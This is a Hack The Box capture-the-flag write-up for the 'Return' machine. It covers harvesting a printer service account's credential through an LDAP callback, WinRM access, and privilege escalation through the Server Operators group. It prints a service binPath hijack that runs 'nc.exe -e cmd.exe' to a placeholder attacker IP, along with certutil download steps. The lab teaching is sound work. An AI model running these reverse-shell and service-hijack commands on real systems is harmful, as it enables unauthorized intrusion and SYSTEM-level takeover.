## Welcome everyone!



Today, we will explore ‘Return’, an easy-rated machine from Hack The Box.

Without further ado, let’s get started!

![image](/HTB/Return/Return_images/1.png)
(Please ensure that you have added the following line `TARGET_IP   return.htb return.local` to your local `/etc/hosts` file to enable **DNS resolution**.)


## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the system we’re targeting:

![image](/HTB/Return/Return_images/2.png)

**DNS** (Port 53)

**HTTP** (Port 80)

**Kerberos** (Port 88)

**RPC** (Port 135)

**NetBIOS** (Port 139)

**LDAP** (Port 389)

**SMB** (Port 445)

**WinRM** (Port 5985)

The `return.local` **domain FQDN** has been identified by **NSE**.

Let’s inspect the website hosted on port 80:

![image](/HTB/Return/Return_images/2.png)

We are greeted with a simple HTML page. Accessing the Settings section redirects us to settings.php, which contains the juiciest information:

![image](/HTB/Return/Return_images/4.png)

We can observe a *Server Address* value which accepts a valid domain or IP and an intriguing Password value containing hidden strings associated with a **svc-printer** user. What happens if we attempt to provide our local IP, listening on port 389, which represents the **LDAP** port? Let’s verify this by setting up a **Netcat listener** through `nc -lvnp 389` in order to see whether any request could be made from the target machine:

![image](/HTB/Return/Return_images/5.png)

## Initial Access

No shell session, but the data settings have been transferred to our own machine, allowing us to retrieve the svc-printer user’s password in plaintext: `1edFg43012!!`. We now have valid credentials to obtain potential initial access, but where could we attempt to use them?

We previously identified from our Nmap scan that **WinRM** was running on the target machine. If the `svc-printer` user were in the *Remote Users Management* group, this would allow us to authenticate using this protocol. Let’s attempt this with `evil-winrm`:

![image](/HTB/Return/Return_images/6.png)

Great, we successfully obtained our initial foothold on the target machine as the svc-printer user. The first flag can now be accessed in the `C:\Users\svc-printer\Desktop\` directory:

![image](/HTB/Return/Return_images/7.png)

## Privilege Escalation

We now want to escalate our current privileges to `SYSTEM` or the **Administrator** user in order to retrieve the final flag.

Listing our current privileges through `whoami /priv` reveals a lot of unusual permissions configured for our current compromised user:

![image](/HTB/Return/Return_images/8.png)

This behavior strongly suggests that we have already compromised a privileged user, which is very helpful for our privilege escalation phase. Since this user has multiple rights, let’s inspect which groups they are part of with the `whoami /groups` command:

![image](/HTB/Return/Return_images/9.png)

Multiple groups are assigned to our current user. Let’s do some research about the first one, which is the `Server Operators` group:

![image](/HTB/Return/Return_images/10.png)

Hence, a sensitive group. As part of their technical support, users who are part of this group are able to **make changes** to Windows services, which represents a very dangerous permission. Indeed, each service is related to a binary path:

![image](/HTB/Return/Return_images/11.png)

In our case, it could be tampered with by an attacker who took control of a privileged account such as `svc-printer`. Because of the group membership, we could use `sc.exe` again to configure the binary path. For example, we could change the `C:\Program Files\VMWare\VMWare Tools\vmtoolsd.exe` path associated with the `*VMTools*` Windows service with a malicious binary that we could upload to an accessible and stealthy directory if we were thinking about persistence.

Let’s transfer a `nc.exe` Netcat Windows-compatible binary to the `C:\Windows\Temp` directory. We will use Netcat again, but this time, directly for shell access. The binary can be hosted on a Python server and downloaded with the `certutil` native Windows utility:

![image](/HTB/Return/Return_images/12.png)

Now that a reverse shell can be initiated from the target system through `nc.exe`, we have to associate a service with the binary path in order to execute any command in a privileged context. We could use the following `sc.exe` **LOTL** command to attach the `C:\Windows\Temp\nc.exe` malicious binary to the `*VMTools*` service so that it is triggered at launch in order to execute a system command through `cmd.exe` that will initiate a connection to our machine:

`sc.exe config VMTools binPath="C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP NC_PORT"`

![image](/HTB/Return/Return_images/13.png)

As we can see, it has been allowed. It's always worth checking:

![image](/HTB/Return/Return_images/14.png)

The binary path has successfully been replaced.

As mentioned earlier, it is required to restart the service for its associated binary to be triggered. This can be done by using `sc.exe` again. The two simple commands that follow could be executed to initiate a privileged shell session on the attacker machine:

`sc.exe stop VMTools`

`sc.exe start VMTools`

Ensure that you have set up your listener with `nc -lvnp <PORT>` to receive the connection. Make sure that Netcat listens on the same port as the one you specified in the previous binary path configuration. For the demonstration, I chose 4422:

![image](/HTB/Return/Return_images/15.png)

It works! We successfully caught the connection. We could verify that we successfully escalated our privileges with `whoami` and `whoami /priv`:

![image](/HTB/Return/Return_images/16.png)

This confirms that we have fully compromised the target system with total access and control over it. The root flag can be retrieved in the `C:\Users\Administrator\Desktop` directory:

![image](/HTB/Return/Return_images/17.png)

Challenge completed!

![image](/HTB/Return/Return_images/18.png)

## Conclusion

**Nop**.

For the first time, I really disliked completing a box from the beginning. The initial access was not very realistic; I think things are very rarely presented that way. I really expected to face an Active Directory environment; the level of service provided had me expecting something completely different—all that just for some hardcoded login credentials that could be retrieved from an exposed website endpoint. However, I appreciated learning more about the `Server Operators` group.

**Thank you for reading…!**

(fatigue is showing)
